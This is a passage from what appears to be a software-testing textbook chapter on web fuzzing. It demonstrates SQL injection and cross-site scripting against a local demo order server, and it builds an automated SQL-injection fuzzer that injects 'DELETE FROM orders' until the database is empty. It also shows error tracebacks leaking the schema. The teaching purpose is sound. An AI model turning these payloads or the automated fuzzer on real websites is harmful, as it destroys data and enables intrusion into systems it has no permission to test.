<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[(&#39;tshirt&#39;, &#39;Jane Doe&#39;, &#39;doe@example.com&#39;, &#39;Seattle&#39;, &#39;98104&#39;), (&#39;lockset&#39;, &#39;Jane Doe&#39;, &#39;j_smith@example.com&#39;, &#39;Seattle&#39;, &#39;16631&#39;), (&#39;drill&#39;, &#39;Jane Doe&#39;, &#39;j.doe@example.com&#39;, &#39;&#39;, &#39;45732&#39;), (&#39;drill&#39;, &#39;Jane Doe&#39;, &#39;j,doe@example.com&#39;, &#39;Seattle&#39;, &#39;45732&#39;), (&#39;drill&#39;, &#39; &#39;, &#39;5F @p   a &#39;, &#39;cdb&#39;, &#39;3230&#39;), (&#39;drill&#39;, &#39; m&#39;, &#39;@@0&#39;, &#39;d&#39;, &#39;9&#39;), (&#39;lockset&#39;, &#39;  &#39;, &#39;c@d&#39;, &#39;_&#39;, &#39;6&#39;), (&#39;lockset&#39;, &#39; &#39;, &#39;d@_-&#39;, &#39;2  0&#39;, &#39;1040&#39;), (&#39;tshirt&#39;, &#39;Kb&#39;, &#39;m@ &#39;, &#39;zy &#39;, &#39;13&#39;), (&#39;lockset&#39;, &#39;d&#39;, &#39;U @t&#39;, &#39; &#39;, &#39;4&#39;), (&#39;tshirt&#39;, &#39;_ 2&#39;, &#39;1  @ &#39;, &#39; &#39;, &#39;30&#39;), (&#39;tshirt&#39;, &#39; &#39;, &#39;a-@ &#39;, &#39; W&#39;, &#39;2&#39;), (&#39;lockset&#39;, &#39;V&#39;, &#39;  @aUeeD&#39;, &#39; &#39;, &#39;01&#39;), (&#39;tshirt&#39;, &#39;oc&#39;, &#39;  @ &#39;, &#39;a&#39;, &#39;25&#39;), (&#39;drill&#39;, &#39;55&#39;, &#39;3&gt;@@5&#39;, &#39;L&#39;, &#39;0&#39;), (&#39;tshirt&#39;, &#39; &#39;, &#39;b t2@ &#39;, &#39;E9&#39;, &#39;54&#39;), (&#39;drill&#39;, &#39;R-&#39;, &#39;e@?&#39;, &#39; &#39;, &#39;5&#39;), (&#39;drill&#39;, &#39;\n    Jane Doe&lt;p&gt;\n    &lt;strong&gt;&lt;a href=&quot;www.lots.of.malware&quot;&gt;Click here for cute cat pictures!&lt;/a&gt;&lt;/strong&gt;\n    &lt;/p&gt;\n    &#39;, &#39;j_smith@example.com&#39;, &#39;Seattle&#39;, &#39;02805&#39;), (&#39;lockset&#39;, &#39;Jane Doe&lt;script&gt;document.title = document.cookie.substring(0, 10);&lt;/script&gt;&#39;, &#39;j.doe@example.com&#39;, &#39;Seattle&#39;, &#39;34506&#39;)]
</pre></div>
</div>
</div>
</div>
<p>Let us go and send our URL with SQL injection to the server.  From the log, we see that the “malicious” SQL command is formed just as sketched above, and executed, too.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">contents</span> <span class="o">=</span> <span class="n">webbrowser</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="n">order_with_injected_sql</span><span class="p">))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:16] INSERT INTO orders VALUES ('drill', 'Jane', 'x', 'x', 'x'); DELETE FROM orders; --', 'j.doe@example.com', 'New York', '14083')
</pre></div><div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:16] "GET /order?item=drill&name=Jane',+'x',+'x',+'x')%3B+DELETE+FROM+orders%3B+--&email=j.doe%40example.com&city=New+York&zip=14083 HTTP/1.1" 200 -
</pre></div></div>
</div>
<p>All orders are now gone:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM orders&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">())</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[]
</pre></div>
</div>
</div>
</div>
<p>This effect is also illustrated <a class="reference external" href="https://xkcd.com/327/">in this very popular XKCD comic</a>:</p>
<p><img alt="https://xkcd.com/327/" src="_images/xkcd_exploits_of_a_mom.png" />{width=100%}</p>
<p>Even if we had not been able to execute arbitrary commands, being able to compromise an orders database offers several possibilities for mischief.  For instance, we could use the address and matching credit card number of an existing person to go through validation and submit an order, only to have the order then delivered to an address of our choice.  We could also use SQL injection to inject HTML and JavaScript code as above, bypassing possible sanitization geared at these domains.</p>
<p>To avoid such effects, the remedy is to <em>sanitize</em> all third-party inputs – no character in the input must be interpretable as plain HTML, JavaScript, or SQL.  This is achieved by properly <em>quoting</em> and <em>escaping</em> inputs.  The <a class="reference internal" href="#Exercises"><span class="xref myst">exercises</span></a> give some instructions on what to do.</p>
</section>
<section id="leaking-internal-information">
<h3>Leaking Internal Information<a class="headerlink" href="#leaking-internal-information" title="Link to this heading">#</a></h3>
<p>To craft the above SQL queries, we have used <em>insider information</em> – for instance, we knew the name of the table as well as its structure.  Surely, an attacker would not know this and thus not be able to run the attack, right?  Unfortunately, it turns out we are leaking all of this information out to the world in the first place.  The error message produced by our server reveals everything we need:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">answer</span> <span class="o">=</span> <span class="n">webbrowser</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="s2">&quot;/order&quot;</span><span class="p">),</span> <span class="n">mute</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Internal Server Error</strong>
  <p>
  The server has encountered an internal error.  Go to our <a href="/">order form</a>.
  <pre>Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/3183845167.py", line 8, in do_GET
    self.handle_order()
    ~~~~~~~~~~~~~~~~~^^
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/1342827050.py", line 4, in handle_order
    self.store_order(values)
    ~~~~~~~~~~~~~~~~^^^^^^^^
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
KeyError: 'item'
</pre>
  </p>
</div>
</body></html>
  </div></div>
</div>
<p>The best way to avoid information leakage through failures is of course not to fail in the first place.  But if you fail, <em>make it hard for the attacker to establish a link between the attack and the failure.</em> In particular,</p>
<ul class="simple">
<li><p>Do not produce “internal error” messages (and certainly not ones with internal information).</p></li>
<li><p>Do not become unresponsive; just go back to the home page and ask the user to supply correct data.</p></li>
</ul>
<p>One more time, the <a class="reference internal" href="#Exercises"><span class="xref myst">exercises</span></a> give some instructions on how to fix the server.</p>
<p>If you can manipulate the server not only to alter information, but also to <em>retrieve</em> information, you can learn about table names and structure by accessing special <em>tables</em> (also called <em>data dictionary</em>) in which database servers store their metadata.  In the MySQL server, for instance, the special table <code class="docutils literal notranslate"><span class="pre">information_schema</span></code> holds metadata such as the names of databases and tables, data types of columns, or access privileges.</p>
</section>
</section>
<section id="fully-automatic-web-attacks">
<h2>Fully Automatic Web Attacks<a class="headerlink" href="#fully-automatic-web-attacks" title="Link to this heading">#</a></h2>
<p>So far, we have demonstrated the above attacks using our manually written order grammar.  However, the attacks also work for generated grammars.  We extend <code class="docutils literal notranslate"><span class="pre">HTMLGrammarMiner</span></code> by adding a number of common SQL injection attacks:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SQLInjectionGrammarMiner</span><span class="p">(</span><span class="n">HTMLGrammarMiner</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Demonstration of an automatic SQL Injection attack grammar miner&quot;&quot;&quot;</span>

    <span class="c1"># Some common attack schemes</span>
    <span class="n">ATTACKS</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s2">&quot;&lt;string&gt;&#39; &lt;sql-values&gt;); &lt;sql-payload&gt;; &lt;sql-comment&gt;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;&lt;string&gt;&#39; &lt;sql-comment&gt;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;&#39; OR 1=1&lt;sql-comment&gt;&#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;&lt;number&gt; OR 1=1&quot;</span><span class="p">,</span>
    <span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">html_text</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">sql_payload</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Constructor.</span>
<span class="sd">        `html_text` - the HTML form to be attacked</span>
<span class="sd">        `sql_payload` - the SQL command to be executed</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="n">html_text</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">QUERY_GRAMMAR</span> <span class="o">=</span> <span class="n">extend_grammar</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">QUERY_GRAMMAR</span><span class="p">,</span> <span class="p">{</span>
            <span class="s2">&quot;&lt;text&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;string&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;sql-injection-attack&gt;&quot;</span><span class="p">],</span>
            <span class="s2">&quot;&lt;number&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;digits&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;sql-injection-attack&gt;&quot;</span><span class="p">],</span>
            <span class="s2">&quot;&lt;checkbox&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;_checkbox&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;sql-injection-attack&gt;&quot;</span><span class="p">],</span>
            <span class="s2">&quot;&lt;email&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;_email&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;sql-injection-attack&gt;&quot;</span><span class="p">],</span>
            <span class="s2">&quot;&lt;sql-injection-attack&gt;&quot;</span><span class="p">:</span> <span class="p">[</span>
                <span class="n">cgi_encode</span><span class="p">(</span><span class="n">attack</span><span class="p">,</span> <span class="s2">&quot;&lt;-&gt;&quot;</span><span class="p">)</span> <span class="k">for</span> <span class="n">attack</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ATTACKS</span>
            <span class="p">],</span>
            <span class="s2">&quot;&lt;sql-values&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">cgi_encode</span><span class="p">(</span><span class="s2">&quot;&lt;sql-values&gt;, &#39;&lt;string&gt;&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;-&gt;&quot;</span><span class="p">)],</span>
            <span class="s2">&quot;&lt;sql-payload&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="n">cgi_encode</span><span class="p">(</span><span class="n">sql_payload</span><span class="p">)],</span>
            <span class="s2">&quot;&lt;sql-comment&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;--&quot;</span><span class="p">,</span> <span class="s2">&quot;#&quot;</span><span class="p">],</span>
        <span class="p">})</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">html_miner</span> <span class="o">=</span> <span class="n">SQLInjectionGrammarMiner</span><span class="p">(</span>
    <span class="n">html_text</span><span class="p">,</span> <span class="n">sql_payload</span><span class="o">=</span><span class="s2">&quot;DROP TABLE orders&quot;</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">grammar</span> <span class="o">=</span> <span class="n">html_miner</span><span class="o">.</span><span class="n">mine_grammar</span><span class="p">()</span>
<span class="n">grammar</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>{&#39;&lt;start&gt;&#39;: [&#39;&lt;action&gt;?&lt;query&gt;&#39;],
 &#39;&lt;string&gt;&#39;: [&#39;&lt;letter&gt;&#39;, &#39;&lt;letter&gt;&lt;string&gt;&#39;],
 &#39;&lt;letter&gt;&#39;: [&#39;&lt;plus&gt;&#39;, &#39;&lt;percent&gt;&#39;, &#39;&lt;other&gt;&#39;],
 &#39;&lt;plus&gt;&#39;: [&#39;+&#39;],
 &#39;&lt;percent&gt;&#39;: [&#39;%&lt;hexdigit-1&gt;&lt;hexdigit&gt;&#39;],
 &#39;&lt;hexdigit&gt;&#39;: [&#39;0&#39;,
  &#39;1&#39;,
  &#39;2&#39;,
  &#39;3&#39;,
  &#39;4&#39;,
  &#39;5&#39;,
  &#39;6&#39;,
  &#39;7&#39;,
  &#39;8&#39;,
  &#39;9&#39;,
  &#39;a&#39;,
  &#39;b&#39;,
  &#39;c&#39;,
  &#39;d&#39;,
  &#39;e&#39;,
  &#39;f&#39;],
 &#39;&lt;other&gt;&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;-&#39;, &#39;_&#39;],
 &#39;&lt;text&gt;&#39;: [&#39;&lt;string&gt;&#39;, &#39;&lt;sql-injection-attack&gt;&#39;],
 &#39;&lt;number&gt;&#39;: [&#39;&lt;digits&gt;&#39;, &#39;&lt;sql-injection-attack&gt;&#39;],
 &#39;&lt;digits&gt;&#39;: [&#39;&lt;digit&gt;&#39;, &#39;&lt;digits&gt;&lt;digit&gt;&#39;],
 &#39;&lt;digit&gt;&#39;: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;],
 &#39;&lt;checkbox&gt;&#39;: [&#39;&lt;_checkbox&gt;&#39;, &#39;&lt;sql-injection-attack&gt;&#39;],
 &#39;&lt;_checkbox&gt;&#39;: [&#39;on&#39;, &#39;off&#39;],
 &#39;&lt;email&gt;&#39;: [&#39;&lt;_email&gt;&#39;, &#39;&lt;sql-injection-attack&gt;&#39;],
 &#39;&lt;_email&gt;&#39;: [&#39;&lt;string&gt;%40&lt;string&gt;&#39;],
 &#39;&lt;hexdigit-1&gt;&#39;: [&#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;],
 &#39;&lt;submit&gt;&#39;: [&#39;&#39;],
 &#39;&lt;sql-injection-attack&gt;&#39;: [&quot;&lt;string&gt;&#39;+&lt;sql-values&gt;)%3b+&lt;sql-payload&gt;%3b+&lt;sql-comment&gt;&quot;,
  &quot;&lt;string&gt;&#39;+&lt;sql-comment&gt;&quot;,
  &quot;&#39;+OR+1%3d1&lt;sql-comment&gt;&#39;&quot;,
  &#39;&lt;number&gt;+OR+1%3d1&#39;],
 &#39;&lt;sql-values&gt;&#39;: [&#39;&#39;, &quot;&lt;sql-values&gt;,+&#39;&lt;string&gt;&#39;&quot;],
 &#39;&lt;sql-payload&gt;&#39;: [&#39;DROP+TABLE+orders&#39;],
 &#39;&lt;sql-comment&gt;&#39;: [&#39;--&#39;, &#39;#&#39;],
 &#39;&lt;action&gt;&#39;: [&#39;/order&#39;],
 &#39;&lt;item&gt;&#39;: [&#39;item=&lt;item-value&gt;&#39;],
 &#39;&lt;item-value&gt;&#39;: [&#39;tshirt&#39;, &#39;drill&#39;, &#39;lockset&#39;],
 &#39;&lt;name&gt;&#39;: [&#39;name=&lt;text&gt;&#39;],
 &#39;&lt;email-1&gt;&#39;: [&#39;email=&lt;email&gt;&#39;],
 &#39;&lt;city&gt;&#39;: [&#39;city=&lt;text&gt;&#39;],
 &#39;&lt;zip&gt;&#39;: [&#39;zip=&lt;number&gt;&#39;],
 &#39;&lt;terms&gt;&#39;: [&#39;terms=&lt;checkbox&gt;&#39;],
 &#39;&lt;submit-1&gt;&#39;: [&#39;submit=&lt;submit&gt;&#39;],
 &#39;&lt;query&gt;&#39;: [&#39;&lt;item&gt;&amp;&lt;name&gt;&amp;&lt;email-1&gt;&amp;&lt;city&gt;&amp;&lt;zip&gt;&amp;&lt;terms&gt;&amp;&lt;submit-1&gt;&#39;]}
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">grammar</span><span class="p">[</span><span class="s2">&quot;&lt;text&gt;&quot;</span><span class="p">]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;&lt;string&gt;&#39;, &#39;&lt;sql-injection-attack&gt;&#39;]
</pre></div>
</div>
</div>
</div>
<p>We see that several fields now are tested for vulnerabilities:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">sql_fuzzer</span> <span class="o">=</span> <span class="n">GrammarFuzzer</span><span class="p">(</span><span class="n">grammar</span><span class="p">)</span>
<span class="n">sql_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&quot;/order?item=lockset&amp;name=4+OR+1%3d1&amp;email=%66%40%3ba&amp;city=%7a&amp;zip=99&amp;terms=1&#39;+#&amp;submit=&quot;
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM orders&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">())</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[]
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">contents</span> <span class="o">=</span> <span class="n">webbrowser</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span>
                              <span class="s2">&quot;/order?item=tshirt&amp;name=Jane+Doe&amp;email=doe</span><span class="si">%40e</span><span class="s2">xample.com&amp;city=Seattle&amp;zip=98104&quot;</span><span class="p">))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:16] INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')
</pre></div><div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:16] "GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1" 200 -
</pre></div></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">orders_db_is_empty</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Return True if the orders database is empty (= we have been successful)&quot;&quot;&quot;</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">entries</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM orders&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">OperationalError</span><span class="p">:</span>
        <span class="k">return</span> <span class="kc">True</span>
    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">entries</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">orders_db_is_empty</span><span class="p">()</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>False
</pre></div>
</div>
</div>
</div>
<p>We create a <code class="docutils literal notranslate"><span class="pre">SQLInjectionFuzzer</span></code> that does it all automatically.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">SQLInjectionFuzzer</span><span class="p">(</span><span class="n">WebFormFuzzer</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Simple demonstrator of a SQL Injection Fuzzer&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">sql_payload</span> <span class="p">:</span> <span class="nb">str</span> <span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="o">*</span><span class="p">,</span>
                 <span class="n">sql_injection_grammar_miner_class</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">type</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
                 <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Constructor.</span>
<span class="sd">        `url` - the Web page (with a form) to retrieve</span>
<span class="sd">        `sql_payload` - the SQL command to execute</span>
<span class="sd">        `sql_injection_grammar_miner_class` - the miner to be used</span>
<span class="sd">            (default: SQLInjectionGrammarMiner)</span>
<span class="sd">        Other keyword arguments are passed to `WebFormFuzzer`.</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sql_payload</span> <span class="o">=</span> <span class="n">sql_payload</span>

        <span class="k">if</span> <span class="n">sql_injection_grammar_miner_class</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
            <span class="n">sql_injection_grammar_miner_class</span> <span class="o">=</span> <span class="n">SQLInjectionGrammarMiner</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sql_injection_grammar_miner_class</span> <span class="o">=</span> <span class="n">sql_injection_grammar_miner_class</span>

        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_grammar</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">html_text</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Obtain a grammar with SQL injection commands&quot;&quot;&quot;</span>

        <span class="n">grammar_miner</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sql_injection_grammar_miner_class</span><span class="p">(</span>
            <span class="n">html_text</span><span class="p">,</span> <span class="n">sql_payload</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">sql_payload</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">grammar_miner</span><span class="o">.</span><span class="n">mine_grammar</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">sql_fuzzer</span> <span class="o">=</span> <span class="n">SQLInjectionFuzzer</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="s2">&quot;DELETE FROM orders&quot;</span><span class="p">)</span>
<span class="n">web_runner</span> <span class="o">=</span> <span class="n">WebRunner</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">)</span>
<span class="n">trials</span> <span class="o">=</span> <span class="mi">1</span>

<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="n">sql_fuzzer</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">web_runner</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">orders_db_is_empty</span><span class="p">():</span>
        <span class="k">break</span>
    <span class="n">trials</span> <span class="o">+=</span> <span class="mi">1</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">trials</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>68
</pre></div>
</div>
</div>
</div>
<p>Our attack was successful! After less than a second of testing, our database is empty:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">orders_db_is_empty</span><span class="p">()</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>True
</pre></div>
</div>
</div>
</div>
<p>Again, note the level of possible automation: We can</p>
<ul class="simple">
<li><p>Crawl the Web pages of a host for possible forms</p></li>
<li><p>Automatically identify form fields and possible values</p></li>
<li><p>Inject SQL (or HTML, or JavaScript) into any of these fields</p></li>
</ul>
<p>and all of this fully automatically, not needing anything but the URL of the site.</p>
<p>The bad news is that with a tool set as the above, anyone can attack websites.  The even worse news is that such penetration tests take place every day, on every website.  The good news, though, is that after reading this chapter, you now get an idea of how Web servers are attacked every day – and what you as a Web server maintainer could and should do to prevent this.</p>
</section>
<section id="lessons-learned">
<h2>Lessons Learned<a class="headerlink" href="#lessons-learned" title="Link to this heading">#</a></h2>
<ul class="simple">
<li><p>User Interfaces (on the Web and elsewhere) should be tested with <em>expected</em> and <em>unexpected</em> values.</p></li>
<li><p>One can <em>mine grammars from user interfaces</em>, allowing for their widespread testing.</p></li>
<li><p>Consequent <em>sanitizing</em> of inputs prevents common attacks such as code and SQL injection.</p></li>
<li><p>Do not attempt to write a Web server yourself, as you are likely to repeat all the mistakes of others.</p></li>
</ul>
<p>We’re done, so we can clean up:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">clear_httpd_messages</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">httpd_process</span><span class="o">.</span><span class="n">terminate</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="next-steps">
<h2>Next Steps<a class="headerlink" href="#next-steps" title="Link to this heading">#</a></h2>
<p>From here, the next step is <a class="reference internal" href="GUIFuzzer.html"><span class="std std-doc">GUI Fuzzing</span></a>, going from HTML- and Web-based user interfaces to generic user interfaces (including JavaScript and mobile user interfaces).</p>
<p>If you are interested in security testing, do not miss our <a class="reference internal" href="InformationFlow.html"><span class="std std-doc">chapter on information flow</span></a>, showing how to systematically detect information leaks; this also addresses the issue of SQL Injection attacks.</p>
</section>
<section id="background">
<h2>Background<a class="headerlink" href="#background" title="Link to this heading">#</a></h2>
<p>The <a class="reference external" href="https://en.wikipedia.org/wiki/Web_application_security">Wikipedia pages on Web application security</a> are a mandatory read for anyone building, maintaining, or testing Web applications.  In 2012, cross-site scripting and SQL injection, as discussed in this chapter, made up more than 50% of Web application vulnerabilities.</p>
<p>The <a class="reference external" href="https://en.wikipedia.org/wiki/Penetration_test">Wikipedia page on penetration testing</a> provides a comprehensive overview on the history of penetration testing, as well as collections of vulnerabilities.</p>
<p>The <a class="reference external" href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">OWASP Zed Attack Proxy Project</a> (ZAP) is an open source website security scanner including several of the features discussed above, and many many more.</p>
</section>
<section id="exercises">
<h2>Exercises<a class="headerlink" href="#exercises" title="Link to this heading">#</a></h2>
<section id="exercise-1-fix-the-server">
